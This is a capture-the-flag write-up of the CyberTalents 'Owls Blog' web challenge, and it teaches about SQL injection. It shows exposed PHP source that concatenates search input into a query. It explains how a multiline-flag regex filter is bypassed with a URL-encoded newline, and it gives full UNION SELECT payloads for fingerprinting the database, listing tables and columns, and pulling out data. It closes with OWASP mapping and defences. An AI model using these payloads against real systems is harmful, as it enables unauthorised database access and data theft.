# Owls Blog - CyberTalents

---

## Challenge Description
**Owls are winking at you. Try to get the flag.**

## Challenge Link
https://cybertalents.com/challenges/web/owls-blog

---

## 1. Initial Interface

The challenge is accessed via the CyberTalents platform, which displays the challenge title, description, and a link to launch the target web application.

<p align="center">
<img width="697" height="371" alt="image" src="https://github.com/user-attachments/assets/805b7957-ce1b-458f-99be-a0be6da00ee8" />
</p>

---

## 2. Challenge Page — Owls Blog Website

Upon navigating to the challenge URL, a blog website is presented with a navigation bar. Clicking through the navigation links reveals nothing obviously exploitable — however a **search blog** input field is identified as a potential injection point since it queries a backend database.

<p align="center">
<img width="939" height="389" alt="image" src="https://github.com/user-attachments/assets/a4d695da-0fec-4bf3-8d2d-7565f7231a67" />
</p>

---

## 3. Directory Enumeration — Using Dirsearch

To discover hidden files on the server, **Dirsearch** is run:

```bash
dirsearch -u http://cdcamxwl32pue3e6mk873oo7fw3y0m236mnkmugv0-web.cybertalentslabs.com/
```

<p align="center">
<img width="228" height="37" alt="image" src="https://github.com/user-attachments/assets/b059d32c-0c2f-4287-97b8-7df5bf092723" />
</p>

<p align="center">
<img width="228" height="37" alt="image" src="https://github.com/user-attachments/assets/34f2b60c-08e6-438b-97b1-cb189dae8744" />
</p>

---

## 4. Investigating `/robots.txt` — Hidden File Discovered

Navigating to `/robots.txt` reveals:

```
User-agent: *
Disallow: git.phps
```

<p align="center">
<img width="137" height="71" alt="image" src="https://github.com/user-attachments/assets/c04008e8-0867-4aa3-ae00-2ce41795f4ac" />
</p>

The `Disallow: git.phps` entry reveals a hidden PHP source file. As seen in previous challenges — **`Disallow` does NOT prevent access**, it only tells search engine bots not to index it. Any human can still navigate directly to the URL.

---

## 5. Downloading `git.phps` — Source Code Exposed

Navigating to `/git.phps` downloads the file. It contains the full PHP source code for the blog search functionality:

```php
<?php
$search = $POST['search'];
if (!preg_match('/^-?[0-9a-z]+$/m', $POST["search"])) {
  die("<h1><font color=\"red\">Hack Detected");
}
$query = "SELECT * FROM topics where topicname like '%$search%'";
$res = mysql_query($query);
$val = mysql_fetch_array($res);
?>
```

### Code Explanation — Line by Line

**Reading the search input:**
```php
$search = $POST['search'];
```
The search value is taken directly from the POST request body — whatever the user typed into the search field.

**The regex filter:**
```php
if (!preg_match('/^-?[0-9a-z]+$/m', $POST["search"])) {
    die("<h1><font color=\"red\">Hack Detected");
}
```

This applies a regex check to the input. If the input does **not** match the pattern `[0-9a-z]` (digits and lowercase letters only), the script dies with **"Hack Detected"**.

**The SQL query:**
```php
$query = "SELECT * FROM topics where topicname like '%$search%'";
```

The search value is inserted **directly** into the SQL query without parameterisation — a classic SQL injection vulnerability. The `LIKE '%$search%'` pattern means the query returns any topic whose name contains the search term.

---

## 6. Analysing the Regex — Finding the Bypass

The regex pattern is:

```
/^-?[0-9a-z]+$/m
```

### What This Regex Does

| Part | Meaning |
|------|---------|
| `^` | Start anchor — in multiline mode, matches start of each line |
| `-?` | Optional leading dash |
| `[0-9a-z]+` | One or more digits or lowercase letters |
| `$` | End anchor — in multiline mode, matches end of each line |
| `/m` | **Multiline flag** — `^` and `$` match per line, not per whole string |

### The `/m` Multiline Flag Vulnerability

This is the **exact same regex bypass** from the "Catch Me If You Can" challenge. The `/m` flag changes how `^` and `$` anchors work:

| Mode | `^` and `$` match |
|------|-------------------|
| Normal (no `/m`) | Start and end of the **entire string** |
| Multiline (`/m`) | Start and end of **each individual line** |

This means if the input contains a **newline character**, the regex only checks each line independently. The first line is checked against `[0-9a-z]` — if it passes, the whole check passes regardless of what comes after the newline.

### The Bypass Payload Structure

```
111%0a'UnIoN(SeLeCt(...))#
```

| Part | Meaning |
|------|---------|
| `111` | Valid `[0-9]` string — passes the regex check on line 1 |
| `%0a` | URL-encoded newline `\n` — splits the input into two lines |
| `'UnIoN(...)` | SQL injection payload — on line 2, never checked by regex |
| Mixed case | `UnIoN`, `SeLeCt`, `fRoM` — bypasses any keyword filter |
| Parentheses | Replace spaces — bypasses space filters |
| `#` | MySQL comment — cancels the rest of the original query |

Because of the `/m` flag:
- Line 1: `111` → matches `[0-9a-z]+` → **passes** ✅
- Line 2: `'UnIoN(SeLeCt(...))#` → **never validated** ✅

Both conditions satisfied — the injection reaches the SQL query.

---

## 7. Fingerprinting the Database — MySQL Version

The search field is tested via **Burp Suite** with the version extraction payload:

```
111%0a'UnIoN(SeLeCt(version()))#
```

<p align="center">
<img width="287" height="385" alt="image" src="https://github.com/user-attachments/assets/871be5c4-0c07-4df2-a63f-9d73e951b42e" />
</p>

The response returns the database version:

```
10.3.23-MariaDB-0+deb10u1
```

The backend database is confirmed as **MariaDB 10.3.23** — a MySQL-compatible database. This means all MySQL syntax and `INFORMATION_SCHEMA` queries will work.

---

## 8. Extracting the Database Schema — Table Names

To discover all table names in the current database, `INFORMATION_SCHEMA.tables` is queried using `GROUP_CONCAT` to return all table names in a single result:

```
111%0a'UnIoN(SeLeCt(GROUP_CONCAT(table_name))fRoM(information_schema.tables)where(table_schema=database()))#
```

**Payload breakdown:**

| Part | Meaning |
|------|---------|
| `111%0a` | Valid first line + newline to split |
| `'UnIoN(SeLeCt(` | Opens the UNION SELECT — mixed case bypasses filter |
| `GROUP_CONCAT(table_name)` | Concatenates all table names into one comma-separated string |
| `fRoM(information_schema.tables)` | From MySQL's built-in schema metadata table |
| `where(table_schema=database())` | Filters to only the current database's tables |
| `))#` | Closes brackets and comments out rest of original query |

### What is `GROUP_CONCAT`?

`GROUP_CONCAT` is a MySQL function that combines multiple rows of results into a single comma-separated string. Without it, the UNION would only return one table name at a time. With it, all table names are returned together in one value — making it much more efficient for enumeration.

| Without GROUP_CONCAT | With GROUP_CONCAT |
|---------------------|------------------|
| Returns one row per table | Returns all tables in one row |
| Need multiple queries | Single query returns everything |

<p align="center">
<img width="293" height="348" alt="image" src="https://github.com/user-attachments/assets/71f6fae0-98c1-4552-9cee-b7d4e6e8aaf9" />
</p>

The response returns two table names:

```
topics, flag
```

The `flag` table is the target.

---

## 9. Extracting the Column Name

With the table name `flag` confirmed, the column name is extracted from `INFORMATION_SCHEMA.columns`:

```
111%0a'UnIoN(SeLeCt(column_name)fRoM(information_schema.columns)where(table_name='flag'))#
```

**Payload breakdown:**

| Part | Meaning |
|------|---------|
| `SeLeCt(column_name)` | Selects the column name field |
| `fRoM(information_schema.columns)` | From MySQL's column metadata table |
| `where(table_name='flag')` | Filters to only columns belonging to the `flag` table |

<p align="center">
<img width="287" height="337" alt="image" src="https://github.com/user-attachments/assets/c4a5443e-a94a-4c3b-9fbd-8d45521ca9ef" />
</p>

The response reveals the column name is also:

```
flag
```

Both the table and the column are named `flag`.

---

## 10. Extracting the Flag

With the table name (`flag`) and column name (`flag`) both known, the flag is extracted directly:

```
111%0a'UnIoN(SeLeCt(flag)fRoM(flag))#
```

**Payload breakdown:**

| Part | Meaning |
|------|---------|
| `SeLeCt(flag)` | Selects the `flag` column |
| `fRoM(flag)` | From the `flag` table |
| `#` | Comments out the rest of the original query |

<p align="center">
<img width="287" height="321" alt="image" src="https://github.com/user-attachments/assets/c41ad91c-42df-4ea3-8697-30e2bf819a32" />
</p>

The response returns the flag:

> **FLAG: `Flag{R3G3X_Ar3_N0T_G00D_For_OW3ls}`**

The flag name itself — `R3G3X_Ar3_N0T_G00D_For_OW3ls` — is the lesson: **Regex filters are not good for security.**

---

# OWASP Classification

This challenge demonstrates two vulnerabilities:

> **OWASP Top 10: A03 — Injection (SQL Injection)**
> The search input was passed directly into a SQL query without parameterisation. A regex filter attempted to block injection — but was bypassed using the `/m` multiline flag and a URL-encoded newline character.

> **OWASP Top 10: A05 — Security Misconfiguration**
> The PHP source file `git.phps` was exposed in the web root and listed in `robots.txt`. This gave the attacker full knowledge of the validation logic — making the bypass straightforward.

---

# Why This Is a Security Issue

| Vulnerability | Impact |
|--------------|--------|
| Source code exposed via `git.phps` | Attacker knows exact regex pattern — bypass is engineered from source |
| `robots.txt` lists `git.phps` | Two disclosure paths — scan and robots.txt both reveal the file |
| Regex filter uses `/m` multiline flag | Newline `%0a` splits input — only first line validated |
| SQL query uses string concatenation | User input reaches the SQL engine directly |
| `INFORMATION_SCHEMA` accessible | Full database schema enumerable |
| `GROUP_CONCAT` returns all tables at once | Faster enumeration — single query reveals everything |

### Why Regex is Not a Secure SQL Injection Defence

| Defence Method | Bypassable? | Why |
|---------------|-------------|-----|
| Regex filter (blocklist) | ✅ Yes — always | Multiline flags, encoding, alternative syntax |
| Keyword filter | ✅ Yes | Mixed case, comments, encoding |
| Parameterised queries | ❌ No | Input treated as data, never as SQL code |
| Stored procedures | ❌ No | Query structure fixed server-side |

The only reliable defence against SQL injection is **parameterised queries (prepared statements)** — where user input is bound as a parameter and can never alter the query structure regardless of its content.

---

# Exploitation Flow (OWASP A03 + A05 Mapping)

1. Attacker accesses the blog website — search field identified as potential injection point
2. Dirsearch run — `/robots.txt` discovered
3. `robots.txt` reveals `git.phps` — PHP source code downloaded
4. Source code reveals regex filter `/^-?[0-9a-z]+$/m` and unsanitised SQL query
5. `/m` multiline flag identified — newline `%0a` bypass planned
6. Burp Suite used to inject `111%0a'UnIoN(SeLeCt(version()))#`
7. Database version confirmed: **MariaDB 10.3.23**
8. `GROUP_CONCAT` + `INFORMATION_SCHEMA.tables` → tables: `topics`, `flag`
9. `INFORMATION_SCHEMA.columns` → column name: `flag`
10. `SELECT flag FROM flag` → flag extracted: **`Flag{R3G3X_Ar3_N0T_G00D_For_OW3ls}`**

---

# Conclusion

This challenge demonstrates **SQL Injection** bypassing a **regex filter** using the `/m` multiline flag vulnerability. The developer attempted to protect the SQL query using a regex pattern — but the `/m` flag caused the anchors `^` and `$` to match per line rather than per string, allowing a newline character to split the input and inject arbitrary SQL on the second line.

The source code exposure via `robots.txt` and `git.phps` gave the attacker a complete blueprint of the defence — making the bypass straightforward to engineer.

To prevent this, applications must:

- **Use parameterised queries** — the only reliable SQL injection defence
- **Never use regex filters as a primary SQL injection defence** — they are always bypassable
- **Never expose source code files** in the web root — delete `.bak`, `.phps`, and similar files before deploying
- **Never list sensitive paths in `robots.txt`** — use proper server-level access controls
- **Test regex patterns with multiline inputs** — the `/m` flag changes anchor behaviour in security-critical ways
